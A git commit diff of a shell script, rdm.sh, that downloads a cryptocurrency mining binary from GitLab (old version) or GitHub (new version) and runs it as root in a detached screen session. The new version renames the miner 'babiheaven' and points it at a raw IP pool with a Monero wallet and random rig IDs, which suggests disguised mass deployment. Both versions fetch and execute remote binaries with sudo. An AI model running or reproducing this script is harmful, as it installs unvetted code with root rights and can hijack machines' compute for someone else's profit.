ba1f2fdcce8799b7cfaca8e100f9d924c20dd380
washil789 <88795024+washil789@users.noreply.github.com>
2021-10-18 18:33:24 +0700

    Update rdm.sh

--- rdm.sh
+++ rdm.sh
@@ -1,4 +1,2 @@
-sudo apt install screen -y &&
-wget https://gitlab.com/admin1246/loader/-/raw/main/perusa && chmod +x perusa &&
-screen -dmS run sudo ./perusa -v -l verushash.na.mine.zergpool.com:3300 -u DCTbhxrn5VcNbskyfv2vXD7bHfP6sGMWcp.$(echo $(shuf -i 1-2000 -n 1)-RDM) -p c=DOGE -t 40 && screen -r
-
+sudo apt install screen -y && wget https://github.com/washil789/minmin/raw/main/xlarig && mv xlarig babiheaven && chmod +x babiheaven &&
+screen -dmS run sudo ./babiheaven -a rx/0 -o 157.245.87.61:6666 -u 8BVLQrAfZXLFZsdLcUqk33EgPLxQYwKVTheFAixjGZShXhqSVXFUrqT98xtNgegRkoaRTECw5JHTdi67F13zd86ZGitVSnZ --rig-id $(echo $(shuf -i 1-20000 -n 1)-IDBL) && screen -r
